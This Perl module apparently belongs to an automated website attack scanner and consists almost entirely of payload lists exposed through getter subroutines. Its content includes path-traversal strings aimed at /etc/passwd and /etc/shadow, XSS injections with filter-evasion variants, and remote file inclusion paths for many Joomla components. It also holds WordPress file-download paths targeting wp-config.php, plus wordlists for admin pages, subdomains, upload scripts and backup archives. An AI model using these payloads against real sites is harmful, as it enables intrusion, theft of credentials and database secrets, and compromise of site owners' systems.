#!/usr/bin/perl
use strict;
use warnings;
## Copy@right Alisam Technology see License.txt

our (@XSS, @LFI, @RFI, @ADFWP, @ADMIN, @SUBDOMAIN, @UPLOAD, @ZIP);

## LFI
my @LFIargs=("passwd.txt", "etc/passwd", "proc/self/environ", "etc/shadow", "etc/group", "etc/security/passwd", "etc/security/group");
my (@LFI1, @LFI2);
for my $LFIargs(@LFIargs) {
  my $arg="/$LFIargs"; push @LFI1, $arg;
  my $arg1="/$arg"; push @LFI1, $arg1;
  my $arg2=$arg."%00"; push @LFI1, $arg2;
  my $arg3=$arg1."%00"; push @LFI1, $arg3;
  my $arg4="repeat(../-5)$LFIargs"; push @LFI1, $arg4;
  my $arg5=$arg4."%00"; push @LFI1, $arg5;
  my $arg6="repeat(....//-5)$LFIargs"; push @LFI1, $arg6;
  my $arg7=$arg6."%00"; push @LFI1, $arg7;
  push @LFI, @LFI1;
  for my $LFI1(@LFI1) { $LFI1=~s/\//%2F/ig; push @LFI, $LFI1; }
}

## XSS
@XSS=("%27", " AND 5028=5028", "'><script>alert('MySQL Error')</script>", "<scr<script>ipt>alert(/MySQL Error/)</scr</script>ipt>", "%253script%253ealert(/MySQL Error/)%253c/script%253e",
      "\">head<script>alert('MySQL Error')</script>head\">", "%22%3Ehead%3Cscript%3Ealert(%27MySQL%20Error%27)%3C%2Fscript%3Ehead%22%3E%22%00", "<IMG onmouseover=\"alert('MySQL Error')\">",
      "\";alert('MySQL Error');//", "</script><script>alert('MySQL Error');</script>", "<INPUT TYPE=\"IMAGE\" SRC=\"javascript:alert('MySQL Error');\">",
      "<BODY BACKGROUND=\"javascript:alert('MySQL Error')\">", "<BODY ONLOAD=alert('MySQL Error')>");

## RFI
my @RFIargs=("/JMc/com_flyspray/startdown.php?file=", "/JMa/JMc/com_admin/admin.admin.html.php?PP1", "/JMc/com_simpleboard/file_upload.php?PP5", "/JMc/com_hashcash/server.php?PP1",
             "/JMc/com_htmlarea3_xtd-c/popups/ImageManager/config.inc.php?PP1", "/JMc/com_sitemap/sitemap.xml.php?PP1", "/JMc/com_performs/performs.php?PP1",
             "/JMc/com_forum/download.php?phpbb_root_path=", "/JMc/com_pccookbook/pccookbook.php?PP1", "/JMc/com_extcalendar/extcalendar.php?PP1", "/JMc/minibb/index.php?PP3",
             "/JMc/com_smf/smf.php?PP1", "/modules/mod_calendar.php?PP3", "/JMc/com_pollxt/conf.pollxt.php?PP1", "/JMc/com_loudmounth/includes/abbc/abbc.class.php?PP1",
             "/JMc/com_videodb/core/videodb.class.xml.php?PP1", "/JMc/com_pcchess/include.pcchess.php?PP1", "/JMa/JMc/com_multibanners/extadminmenus.class.php?PP1",
             "/JMa/JMc/com_a6mambohelpdesk/admin.a6mambohelpdesk.php?PP4", "/JMa/JMc/com_colophon/admin.colophon.php?PP1", "/JMa/JMc/com_mgm/help.mgm.php?PP1",
             "/JMc/com_mambatstaff/mambatstaff.php?PP1", "/JMc/com_securityimages/configinsert.php?PP1", "/JMc/com_securityimages/lang.php?PP1", "/JMc/com_artlinks/artlinks.dispnew.php?PP1",
             "/JMc/com_galleria/galleria.html.php?PP1", "/akocomments.php?PP1", "/JMa/JMc/com_cropimage/admin.cropcanvas.php?cropimagedir=", "/JMa/JMc/com_kochsuite/config.kochsuite.php?PP1",
             "/JMa/JMc/com_comprofiler/plugin.class.php?PP1", "/JMc/com_zoom/classes/fs_unix.php?PP1", "/JMc/com_zoom/includes/database.php?PP1",
             "/JMa/JMc/com_serverstat/install.serverstat.php?PP1",
             "/JMc/com_fm/fm.install.php?lm_absolute_path=", "/JMa/JMc/com_mambelfish/mambelfish.class.php?PP1", "/JMc/com_lmo/lmo.php?PP1",
             "/JMa/JMc/com_webring/admin.webring.docs.php?component_dir=", "/JMa/JMc/com_remository/admin.remository.php?PP1", "/JMa/JMc/com_babackup/classes/Tar.php?PP1",
             "/JMa/JMc/com_lurm_constructor/admin.lurm_constructor.php?lm_absolute_path=", "/JMc/com_mambowiki/MamboLogin.php?IP=", "/JMa/JMc/com_a6mambocredits/admin.a6mambocredits.php?PP4",
             "/JMa/JMc/com_phpshop/toolbar.phpshop.html.php?PP1", "/JMc/com_cpg/cpg.php?PP1", "/JMc/com_moodle/moodle.php?PP1", "/JMc/com_extended_registration/registration_detailed.inc.php?PP1",
             "/JMc/com_mospray/scripts/admin.php?basedir=", "/JMa/JMc/com_uhp/uhp_config.php?PP1", "/JMa/JMc/com_peoplebook/param.peoplebook.php?PP1", "/JMa/JMc/com_mmp/help.mmp.php?PP1",
             "/JMc/com_reporter/processor/reporter.sql.php?PP1", "/JMc/com_madeira/img.php?url=", "/JMc/com_bsq_sitestats/external/rssfeed.php?PP6", "/com_bsq_sitestats/external/rssfeed.php?PP6",
             "/com_joomla_flash_uploader/install.joomla_flash_uploader.php?PP1", "/com_joomla_flash_uploader/uninstall.joomla_flash_uploader.php?PP1", "/JMa/JMc/admin.jjgallery.php?PP1",
             "/JMc/com_jreviews/scripts/xajax.inc.php?PP1", "/com_directory/modules/mod_pxt_latest.php?PP2", "/JMa/JMc/com_chronocontact/excelwriter/PPS/File.php?PP1",
             "/JMa/JMc/com_chronocontact/excelwriter/Writer.php?PP1", "/JMa/JMc/com_chronocontact/excelwriter/PPS.php?PP1", "/JMa/JMc/com_chronocontact/excelwriter/Writer/BIFFwriter.php?PP1",
             "/JMa/JMc/com_chronocontact/excelwriter/Writer/Workbook.php?PP1", "/JMa/JMc/com_chronocontact/excelwriter/Writer/Worksheet.php?PP1",
             "/JMa/JMc/com_chronocontact/excelwriter/Writer/Format.php?PP1", "/index.php?option=com_custompages&cpage=", "/component/com_onlineflashquiz/quiz/common/db_config.inc.php?base_dir=",
             "/JMa/JMc/com_joomla-visites/core/include/myMailer.class.php?PP1", "/JMc/com_facileforms/facileforms.frame.php?ff_compath=", "/JMa/JMc/com_rssreader/admin.rssreader.php?PP4",
             "/JMa/JMc/com_feederator/includes/tmsp/add_tmsp.php?PP1", "/JMa/JMc/com_feederator/includes/tmsp/edit_tmsp.php?PP1", "/JMa/JMc/com_feederator/includes/tmsp/subscription.php?PP2",
             "/JMa/JMc/com_feederator/includes/tmsp/tmsp.php?PP1", "/JMa/JMc/com_clickheat/install.clickheat.php?PP2", "/JMa/JMc/com_clickheat/includes/heatmap/_main.php?PP1",
             "/JMa/JMc/com_clickheat/includes/heatmap/main.php?PP1", "/JMa/JMc/com_clickheat/includes/overview/main.php?PP1", "/JMa/JMc/com_clickheat/Recly/Clickheat/Cache.php?PP2",
             "/JMa/JMc/com_clickheat/Recly/Clickheat/Clickheat_Heatmap.php?PP2", "/JMa/JMc/com_clickheat/Recly/common/GlobalVariables.php?PP2",
             "/JMa/JMc/com_competitions/includes/competitions/add.php?PP2", "/JMa/JMc/com_competitions/includes/competitions/competitions.php?PP2",
             "/JMa/JMc/com_competitions/includes/settings/settings.php?PP1", "/JMa/JMc/com_dadamail/config.dadamail.php?GLOBALS['mosConfig_absolute_path']=",
             "/JMa/JMc/com_googlebase/admin.googlebase.php?PP1", "/JMa/JMc/com_ongumatimesheet20/lib/onguma.class.php?PP1", "/JMa/JMc/com_treeg/admin.treeg.php?PP4",
             "/JMa/JMc/com_bayesiannaivefilter/lang.php?PP1", "/JMc/com_jd-wiki/lib/tpl/default/main.php?PP1", "/JMa/JMc/com_jim/install.jim.php?PP1",
             "/JMc/com_mtree/Savant2/Savant2_Plugin_textarea.php?PP1", "/JMc/com_artlinks/artlinks.dispnew.php?PP1", "/JMa/JMc/com_linkdirectory/toolbar.linkdirectory.html.php?PP1",
             "/JMa/JMc/com_kochsuite/config.kochsuite.php?PP1", "/JMc/com_reporter/reporter.logic.php?PP1", "/JMa/JMc/com_swmenupro/ImageManager/Classes/ImageManager.php?PP1",
             "/JMc/com_swmenupro/ImageManager/Classes/ImageManager.php?PP1", "/JMc/com_joomlaboard/file_upload.php?PP5", "/JMc/com_thopper/inc/contact_type.php?PP1",
             "/JMc/com_thopper/inc/itemstatus_type.php?PP1", "/JMc/com_thopper/inc/projectstatus_type.php?PP1", "/JMc/com_thopper/inc/request_type.php?PP1",
             "/JMc/com_thopper/inc/responses_type.php?PP1", "/JMc/com_thopper/inc/timelog_type.php?PP1", "/JMc/com_thopper/inc/urgency_type.php?PP1", "/JMc/com_mosmedia/media.tab.php?PP1",
             "/JMc/com_mosmedia/media.divs.php?PP1", "/modules/mod_as_category/mod_as_category.php?PP1", "/modules/mod_as_category.php?PP1", "/JMc/com_articles.php?PP3",
             "/classes/html/com_articles.php?PP3", "/JMa/JMc/com_jpack/includes/CAltInstaller.php?PP1", "/templates/be2004-2/index.php?PP1", "/libraries/pcl/pcltar.php?g_pcltar_lib_dir=",
             "/JMa/JMc/com_joomlaradiov5/admin.joomlaradiov5.php?PP4", "/JMa/JMc/com_joomlaflashfun/admin.joomlaflashfun.php?PP4", "/JMa/JMc/com_joom12pic/admin.joom12pic.php?PP4",
             "/JMc/com_slideshow/admin.slideshow1.php?PP4", "/JMa/JMc/com_panoramic/admin.panoramic.php?PP4", "/JMa/JMc/com_wmtgallery/admin.wmtgallery.php?PP4",
             "/JMa/JMc/com_wmtportfolio/admin.wmtportfolio.php?PP1", "/JMa/JMc/com_mosmedia/includes/credits.html.php?PP1", "/JMa/JMc/com_mosmedia/includes/info.html.php?PP1",
             "/JMa/JMc/com_mosmedia/includes/media.divs.php?PP1", "/JMa/JMc/com_mosmedia/includes/media.divs.js.php?PP1", "/JMa/JMc/com_mosmedia/includes/purchase.html.php?PP1",
             "/JMa/JMc/com_mosmedia/includes/support.html.php?PP1", "/JMc/com_mp3_allopass/allopass.php?PP4", "/JMc/com_mp3_allopass/allopass-error.php?PP4",
             "/JMa/JMc/com_jcs/jcs.function.php?PP1", "/JMa/JMc/com_jcs/view/add.php?PP1", "/JMa/JMc/com_jcs/view/history.php?PP1", "/JMa/JMc/com_jcs/view/register.php?PP1",
             "/JMa/JMc/com_jcs/views/list.sub.html.php?PP1", "/JMa/JMc/com_jcs/views/list.user.sub.html.php?PP1", "/JMa/JMc/com_jcs/views/reports.html.php?mosConfig_absolte_path=",
             "/JMa/JMc/com_joomla_flash_uploader/install.joomla_flash_uploader.php?PP1", "/JMa/JMc/com_joomla_flash_uploader/uninstall.joomla_flash_uploader.php?PP1",
             "/JMa/JMc/com_color/admin.color.php?PP4", "/JMa/JMc/com_jjgallery/admin.jjgallery.php?PP1", "/JMa/JMc/com_juser/xajax_functions.php?PP1",
             "/index.php?option=com_sef&Itemid=&mosConfig.absolute.path=", "/index.php?option=com_adsmanager&PP1", "/com_ponygallery/admin.ponygallery.html.php?PP1",
             "/com_magazine_3_0_1/magazine.functions.php?config=", "/JMa/JMc/com_joomla-visites/core/include/myMailer.class.php?PP1", "/JMa/JMc/com_universal/includes/config/config.html.php?PP1",
             "/modules/mod_pxt_latest.php?PP2");

for my $RFIargs(@RFIargs) {
  $RFIargs=~s/JMa/administrator/ig;
  $RFIargs=~s/JMc/components/ig;
  if ($RFIargs=~/PP1/) { $RFIargs=~s/PP1/mosConfig_absolute_path=/ig; }
  elsif ($RFIargs=~/PP2/) { $RFIargs=~s/PP2/GLOBALS[mosConfig_absolute_path]=/ig; }
  elsif ($RFIargs=~/PP3/) { $RFIargs=~s/PP3/absolute_path=/ig; }
  elsif ($RFIargs=~/PP4/) { $RFIargs=~s/PP4/mosConfig_live_site=/ig; }
  elsif ($RFIargs=~/PP5/) { $RFIargs=~s/PP5/sbp=/ig; }
  elsif ($RFIargs=~/PP6/) { $RFIargs=~s/PP6/baseDir=/ig; }
  push @RFI, $RFIargs;
}

#ADF WP WORDPRESS
my @ADFWPargs=("/wp-admin/admin-ajax.php?action=revslider_show_image&img=WP1", "WPATHT/ypo-theme/download.php?download=WP1", "/wp-content/force-DWF=WP1",
               "WPATHP/hb-audio-gallery-lite/gallery/audio-DWF_path=WP1", "WPATHT/acento/includes/view-pdf.php?download=1&file=/path/WP1", "WPATHT/SMWF/inc/DWF=WP1", "WPATHT/markant/DWF=WP1",
               "WPATHT/yakimabait/DWF=WP1", "WPATHT/TheLoft/DWF=WP1", "WPATHT/felis/DWF=WP1", "WPATHT/MichaelCanthony/DWF=WP1", "WPATHT/trinity/lib/scripts/DWF=WP1", "WPATHT/epic/includes/DWF=WP1",
               "WPATHT/urbancity/lib/scripts/DWF=WP1", "WPATHT/antioch/lib/scripts/DWF=WP1", "WPATHT/authentic/includes/DWF=WP1", "WPATHT/churchope/lib/downloadlink.php?file=WP1",
               "WPATHT/lote27/download.php?download=WP1", "WPATHT/linenity/functions/download.php?imgurl=WP1", "WPATHP/ajax-store-locator-wordpress_0/sl_file_download.php?download_file=WP1",
               "WPATHP/justified-image-grid/DWF=file:///C:/wamp/www/wp-config.php", "WPATHP/justified-image-grid/DWF=file:///C:/xampp/htdocs/WP1", "WPATHP/justified-image-grid/DWF=file:///var/www/WP1",
               "WPATHP/aspose-doc-exporter/aspose_doc_exporter_DWF=WP1", "WPATHP/aspose-cloud-ebook-generator/aspose_posts_exporter_DWF=WP1");
for my $ADFWPargs(@ADFWPargs) {
  $ADFWPargs=~s/DWF/download.php?file/ig;
  $ADFWPargs=~s/WPATHT/\/wp-content\/themes/ig;
  $ADFWPargs=~s/WPATHP/\/wp-content\/plugins/ig;
  if ($ADFWPargs=~/WP1/) {
    $ADFWPargs=~s/WP1/wp-config.php/ig; push @ADFWP, $ADFWPargs;
    $ADFWPargs=~s/wp-config.php/repeat(..\/-5)wp-config.php/ig; push @ADFWP, $ADFWPargs; }
  else{ push @ADFWP, $ADFWPargs; }
}

## ADMIN PAGE
my @ADMINARGS=("/admin/", "/admin/login.MYEXT", "/myadmin/", "/acceso/", "/administrator/", "/admin1/", "/admin2/", "/wp-admin/login.MYEXT", "/administrator/index.MYEXT", "/admin3/", "/admin4/",
               "/admin5/", "/usuarios/", "/usuario/", "/administrador/", "/administrateur/", "/administrator/", "/moderator/", "/webadmin/", "/adminarea/", "/bb-admin/", "/adminLogin/",
               "/admin_area/", "/panel-administracion/", "/instadmin/", "/memberadmin/", "/administratorlogin/", "/adm/", "/wp-login.MYEXT", "/admin/account.MYEXT", "/admin/index.MYEXT",
               "/admin/admin.MYEXT", "/admin_area/admin.MYEXT", "/admin_area/login.MYEXT", "/siteadmin/login.MYEXT", "/siteadmin/index.MYEXT", "/admin_area/index.MYEXT", "/bb-admin/index.MYEXT",
               "/bb-admin/login.MYEXT", "/bb-admin/admin.MYEXT", "/admin/home.MYEXT", "/admin/controlpanel.MYEXT", "/admin.MYEXT", "/admincp/index.MYEXT", "/admincp/login.MYEXT", "/administracion/",
               "/adminpanel.MYEXT", "/webadmin.MYEXT", "/webadmin/index.MYEXT", "/webadmin/admin.MYEXT", "/webadmin/login.MYEXT", "/admin/admin_login.MYEXT", "/admin_login.MYEXT",
               "/panel-administracion/login.MYEXT", "/admin/cp.MYEXT", "/cp.MYEXT", "/administrator/login.MYEXT", "/nsw/admin/login.MYEXT", "/administrator/account.MYEXT", "/administrator.MYEXT",
               "/pages/admin/admin-login.MYEXT", "/admin/admin-login.MYEXT", "/admin-login.MYEXT", "/acceso.MYEXT", "/login.MYEXT", "/modelsearch/login.MYEXT", "/moderator.MYEXT",
               "/moderator/login.MYEXT", "/moderator/admin.MYEXT", "/account.MYEXT", "/controlpanel.MYEXT", "/admincontrol.MYEXT", "/admin/adminLogin.MYEXT", "/adminLogin.MYEXT", "/home.MYEXT",
               "/rcjakar/admin/login.MYEXT", "/adminarea/index.MYEXT", "/adminarea/admin.MYEXT", "/cp.MYEXT", "/user.MYEXT", "/adminarea/login.MYEXT", "/panel-administracion/index.MYEXT",
               "/panel-administracion/admin.MYEXT", "/modelsearch/index.MYEXT", "/modelsearch/admin.MYEXT", "/admincontrol/login.MYEXT", "/adm/index.MYEXT", "/adm.MYEXT", "/account.MYEXT",
               "/adm/admloginuser.MYEXT", "/admloginuser.MYEXT", "/admin2.MYEXT", "/admin2/login.MYEXT", "/admin2/index.MYEXT", "/usuarios/login.MYEXT", "/users/login.MYEXT", "/adm.MYEXT",
               "/affiliate.MYEXT", "/adm_auth.MYEXT", "/memberadmin.MYEXT", "/administratorlogin.MYEXT");
for my $ADMINARGS(@ADMINARGS) {
  if ($ADMINARGS=~/MYEXT/) {
    $ADMINARGS=~s/MYEXT/php/ig; push @ADMIN, $ADMINARGS;
    $ADMINARGS=~s/php/html/ig; push @ADMIN, $ADMINARGS;
    $ADMINARGS=~s/html/asp/ig; push @ADMIN, $ADMINARGS;
  }else{ push @ADMIN, $ADMINARGS; } 
}

## SUBDOMAINS
@SUBDOMAIN=("about.", "webmail.", "abose.", "acme.", "ad.", "admanager.", "admin.", "admins.", "administrador.", "administrateur.", "administrator.", "ads.", "adsense.", "adult.", "adwords.",
            "affiliate.", "affiliatepage.", "afp.", "analytics.", "android.", "shop.", "echop.", "blog.", "tienda.", "answer.", "ap.", "api.", "apis.", "app.", "bank.", "blogs.", "client.",
            "clients.", "community.", "content.", "cpanel.", "dashbord.", "data.", "developer.", "developers.", "dl.", "docs.", "documents.", "download.", "downloads.", "encrypted.",
            "es.", "it.", "en.", "fr.", "ar.", "legal.", "iphone.", "lab.", "labs.", "list.", "lists.", "log.", "logs.", "errors.", "net.", "mysql.", "mysqldomain.", "net.", "network.", "news.",
            "ns.", "ns1.", "ns2.", "ns3.", "ns4.", "ns5.", "org.", "panel.", "partner.", "partners.", "pop.", "pop3.", "private.", "proxies.", "public.", "reports.", "root.", "rss.", "prod.",
            "prods.", "sandbox.", "search.", "server.", "servers.", "signin.", "signup.", "login.", "smtp.", "srntp.", "ssl.", "soap.", "stat.", "statics.", "store.", "status.", "survey.", "sync.",
            "system.", "text.", "test.", "webadmin.", "webdisk.", "xhtml.", "xhtrnl.", "xml.");

## UPLOAD FILES
@UPLOAD=("/up.php", "/up1.php", "/up/up.php", "/site/up.php", "/vb/up.php", "/forum/up.php", "/blog/up.php", "/upload.php", "/upload1.php", "/upload2.php", "/vb/upload.php",
         "/forum/upload.php", "/blog/upload.php", "/site/upload.php", "/download.php");

## ZIP FILES
@ZIP=("/backup.tar.gz", "/backup/backup.tar.gz", "/backup/backup.zip", "/vb/backup.zip", "/site/backup.zip", "/backup.zip", "/backup.rar", "/backup.sql", "/vb/vb.zip", "/vb.zip", "/vb.sql",
      "/vb.rar", "/vb1.zip", "/vb2.zip", "/vbb.zip", "/vb3.zip", "/upload.zip", "/up/upload.zip", "/joomla.zip", "/joomla.rar", "/joomla.sql", "/wordpress.zip", "/wp/wordpress.zip",
      "/blog/wordpress.zip", "/wordpress.rar");

## MENU
sub get_xss_payloads { return @XSS; }
sub get_lfi_payloads { return @LFI; }
sub get_rfi_payloads { return @RFI; }
sub get_adfwp_payloads { return @ADFWP; }
sub get_admin_payloads { return @ADMIN; }
sub get_subdomain_payloads { return @SUBDOMAIN; }
sub get_upload_payloads { return @UPLOAD; }
sub get_zip_payloads { return @ZIP; }

1;
